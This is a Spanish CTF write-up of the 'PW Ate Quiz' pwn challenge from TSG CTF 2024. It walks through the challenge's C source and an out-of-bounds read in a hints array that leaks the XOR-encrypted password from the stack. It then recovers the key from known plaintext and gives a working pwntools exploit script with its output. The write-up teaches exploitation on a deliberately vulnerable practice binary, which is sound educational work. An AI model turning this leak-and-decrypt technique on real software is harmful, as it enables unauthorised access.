---
layout: post
title: PW Ate Quiz TSG CTF 2024
comments: true
categories: [Pwn, Writeups, TSGCTF]
---

Este fin de semana no tenía mucho tiempo pero sí que me pude pasar un ratito por el [TSG CTF](https://ctftime.org/event/2424/). Me sorprendió lo bonita que era la página y lo bien desarrollados que estaban los retos, explorando las vulnerabilidades de forma más realista. Os dejo por aquí el único reto en el que pude trabajar, aunque no pude terminarlo (me falló la programación).

<br>

![Image]({{ site.baseurl }}/images/posts/TSG-logo.png){:width="400px"}

<br>

# Overview

La descripción del reto nos dice lo siguiente:

	It seems that if you enter the correct password, they will give you the flag.

Por lo que ya sabemos que nuestro objetivo será introducir la contraseña correcta.

<br>

# Reconocimiento

Comenzamos lanzando *checksec*:

```
	Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Vemos que tenemos todas las protecciones activadas, por lo que tendremos que ingeniárnoslas. Inspeccionando el código, vemos que hay una función *crypting* que encripta una palabra mediante una clave.

```c
void crypting(long long* secret, size_t len, long long key) {
	for (int i = 0; i < (len - 1) / 8 + 1; i++) {
		secret[i] = secret[i] ^ key;
	}
}
```

La clave se genera en `main`:

```c
srand(time(0));
long long key = ((long long)rand() << 32) | rand();
```

Vemos también una función `output_flag` que imprime la flag:

```c
void output_flag() {
	char flag[100];
	FILE *fd = fopen("./flag.txt", "r");
	if (fd == NULL) {
		puts("Could not open \"flag.txt\"");
		exit(1);
	}
	fscanf(fd, "%99s", flag);
	printf("%s\n", flag);
}
```

En la función principal vemos que se nos pide una contraseña, se encripta con la clave, y se compara con una contraseña interna, también encriptada:

```c
int main() {
	setvbuf(stdout, NULL, _IONBF, 0);

	char hints[3][8] = {"Hint1:T", "Hint2:S", "Hint3:G"};
	char password[0x20];
	char input[0x20];
	

	srand(time(0));
	long long key = ((long long)rand() << 32) | rand();

	FILE *fd = fopen("password.txt", "r");
	if (fd == NULL) {
		puts("Could not open \"password.txt\"");
		exit(1);
	}

	fscanf(fd, "%31s", password);
	size_t length = strlen(password);
	crypting((long long*)password, 0x20, key);

	printf("Enter the password > ");
	scanf("%31s", input);

	crypting((long long*)input, 0x20, key);

	if (memcmp(password, input, length + 1) == 0) {
		puts("OK! Here's the flag!");
		output_flag();
		exit(0);
	}
```

Si acertamos nos da la flag, y si no, nos deja recibir pistas. Las pistas están definidas como una estructura: `char hints[3][8] = {"Hint1:T", "Hint2:S", "Hint3:G"};`, y al dárnoslas, se accede a la posición de la estructura que especifiquemos y se imprimen 8 caracteres. Sin embargo, a la hora de leer datos de esa estructura, no verifica si la posición a la que se trata de acceder está dentro de la estructura.

```c
	puts("Authentication failed.");
	puts("You can get some hints.");
	
	while (1) {
		int idx;
		printf("Enter a hint number (0~2) > ");
		if (scanf("%d", &idx) == 1 && idx >= 0) {
			for (int i = 0; i < 8; i++) {
				putchar(hints[idx][i]);		// Vulnerable a accesos fuera de rango
			}
			puts("");
		} else {
			break;
		}
	}
	while (getchar()!='\n');
```

Finalmente, nos vuelve a dejar introducir la contraseña:

```c
	printf("Enter the password > ");
	scanf("%31s", input);

	crypting((long long*)input, 0x20, key);

	if (memcmp(password, input, length + 1) == 0) {
		puts("OK! Here's the flag!");
		output_flag();
	} else {
		puts("Authentication failed.");
	}

	return 0;
}
```

<br>

# Explotación

## *Leakear* datos del stack

Como hemos dicho, si tratamos de pedir pistas fuera de la estructura podemos *leakear* datos del stack. Esto es especialmente peligroso si vemos en qué orden están definidas las variables:

```c
char hints[3][8] = {"Hint1:T", "Hint2:S", "Hint3:G"};
char password[0x20];
char input[0x20];
```

Esto provoca que tanto la `password` como el `input` vayan justo después de la estructura de las pistas. Si observamos el stack con *gdb-peda* se ve más claro (los datos están cifrados ya por el momento en el que puse el break):

```c
gdb-peda$ telescope 30
0000| 0x7fffffffdb90 --> 0x80000
0008| 0x7fffffffdb98 --> 0x3f6400b937337d10
0016| 0x7fffffffdba0 --> 0x5555555592a0 --> 0xfbad2488
// Estructura hints
0024| 0x7fffffffdba8 --> 0x1b
0032| 0x7fffffffdbb0 --> 0x543a31746e6948 ('Hint1:T')
0040| 0x7fffffffdbb8 --> 0x533a32746e6948 ('Hint2:S')
0048| 0x7fffffffdbc0 --> 0x473a33746e6948 ('Hint3:G')
0056| 0x7fffffffdbc8 --> 0x0
//Password (cifrada)
0064| 0x7fffffffdbd0 --> 0x12176994445a1544
0072| 0x7fffffffdbd8 --> 0x121d6dd442575071
0080| 0x7fffffffdbe0 --> 0x5b166fce44401c60
0088| 0x7fffffffdbe8 --> 0x3f6400b937125c31
//Input (cifrado)
0096| 0x7fffffffdbf0 --> 0x12176994445a1544
0104| 0x7fffffffdbf8 --> 0x121d6dd442575071
0112| 0x7fffffffdc00 --> 0x5b166fce44401c60
0120| 0x7fffffffdc08 --> 0x3f6400b937125c31
// Clave
0128| 0x7fffffffdc10 --> 0x0
0136| 0x7fffffffdc18 --> 0x3d2f920632386500
0144| 0x7fffffffdc20 --> 0x0
```

## Obtener la clave

En este punto necesitamos la clave para descifrar la password. Para obtenerla hay varias opciones:

- La primera es tomarla del propio stack.
- La segunda, y la que explicaré (porque serviría incluso si se generara mejor y no se pudiera obtener del stack), es sacarla a partir de la contraseña y el input cifrados.
- La última es la que intenté sin éxito. Parte de la base de que la semilla se genera con la marca de tiempo del segundo en el que se ejecuta el programa (`srand(time(0));`). Por lo que si ejecutaramos el mismo código en el mismo segundo, deberíamos obtener la misma semilla.

Como he dicho, vamos a obtener la clave utilizando nuestro mensaje cifrado. Como sabemos, la función XOR es **reversible**, es decir que si aplicamos XOR de nuevo entre un mensaje cifrado y la clave, descifra el mensaje. Pero, esto también funciona si lo aplicamos entre el mensaje cifrado y el original, devolviéndonos la clave:

```
XORed_msg ^ key = msg
XORed_msg ^ msg = key
```

Por tanto, podemos recuperar la clave, y aplicando XOR entre la clave y la contraseña cifrada, logramos descifrarla.

## Script

Para resolver el reto utilizaremos *python* y la librería *pwntools*:

```python
#!/bin/python3

from pwn import *

def decipher_password(xored_password, xored_input, raw_input):
    """Si tenemos dos palabras cifradas con la misma clave, podemos recuperar la clave    """

    log.info(f"XORed_Pass: {xored_password.hex()}")
    log.info(f"XORed_Inpt: {xored_input.hex()}")
    
    key = xor(raw_input, xored_input)
    password = xor(xored_password, key)

    log.info(f"Password: {password.hex()}")

    return password

def read_hint(p, idx):
    """Permite leakear info de un hint."""
    p.recvuntil(b"Enter a hint number (0~2) > ")
    p.sendline(str(idx).encode())
    return p.recv(8)

def main():

    p = process("./chall")

    raw_input = b"A"*0x1f + b"\x00"
    p.sendline(raw_input[:-1])

    xored_password = b""
    xored_input = b""
    
    for i in range(4):
        xored_password += read_hint(p, 4 + i)
        
    for i in range(4):
        xored_input += read_hint(p, 8 + i)
    
    password = decipher_password(xored_password, xored_input, raw_input)

    p.sendline(b"lets go") # Para salir del bucle de hints
    
    p.sendline(password)
    
    p.interactive()

if __name__ == "__main__":
    main()
```

Con este programa obtendremos la flag (sustituye `process` por `remote` para el servidor):

```bash
./solver.py
[+] Starting local process './chall': pid 33550
[*] XORed_Pass: 314c10312aa8082a04091d376aac022a15450a3170ae09634405584207c17b07
[*] XORed_Inpt: 2465380346803a462465380346803a462465380346803a462465380346803a07
[*] Password: 546869732d69732d612d64756d6d792d70617373776f72642121210000000000
[*] Switching to interactive mode

Enter a hint number (0~2) > [*] Process './chall' stopped with exit code 0 (pid 33550)
Enter the password > OK! Here's the flag!
TSGCTF{dummy_f14g}
```

La verdad que para ser un programa con una vulnerabilidad de *pwn* bastante simple, es interesante llegar a una solución. Si tengo tiempo intentaré traer algún otro ejercicio de este CTF. Mientras tanto échale un ojo al resto de posts :)

<br>